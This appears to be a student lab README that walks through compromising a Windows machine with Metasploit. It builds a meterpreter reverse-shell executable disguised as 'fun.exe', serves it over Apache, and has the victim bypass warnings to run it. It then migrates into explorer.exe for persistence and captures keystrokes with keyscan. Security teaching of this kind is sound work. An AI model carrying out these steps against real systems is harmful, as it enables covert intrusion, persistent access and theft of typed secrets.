# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:
<img width="894" height="332" alt="image" src="https://github.com/user-attachments/assets/ca308b6b-45c4-45ed-8dae-4bad7e2a1c04" />


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT
<img width="1092" height="170" alt="image" src="https://github.com/user-attachments/assets/0600f5cb-11f1-4f7e-9d4a-bf9c4cb4ff41" />


copy the fun.exe into the apache /var/www/html folder

<img width="351" height="46" alt="image" src="https://github.com/user-attachments/assets/62acd206-c611-46f5-8e9b-0ad1683f3765" />

Start apache server
sudo systemctl apache2 start

<img width="632" height="55" alt="image" src="https://github.com/user-attachments/assets/f5982029-3aa9-401f-8b4c-369d11ef9149" />

Check the status of apache2

<img width="955" height="381" alt="image" src="https://github.com/user-attachments/assets/972372a2-0ccd-4e2f-8df6-9fd1116fc42f" />
                                                                                                                       
Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler

<img width="783" height="631" alt="image" src="https://github.com/user-attachments/assets/3ab84c68-c965-41da-9520-a3c13ccae96a" />

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![download](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/a6b73051-a143-4740-b3d9-27c23762218f)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![exploit](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/b46a08f7-a9fc-4e71-8fdd-170ee187dd22)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![meterpreter-ps](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/7e6e28fb-b095-4fd1-81f8-a0292f82c9a2)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![migrate-Nexplorer](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/836e6efa-423f-4553-ad2f-19170b010892)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![notepad](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/35be18d7-51b0-4529-8fd8-76740f0c9ba6)
keyscan_dump	Shows the keystrokes captured so far
![keyscan_dump](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d40a4428-0c65-4855-be1d-c278766082fb)






## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
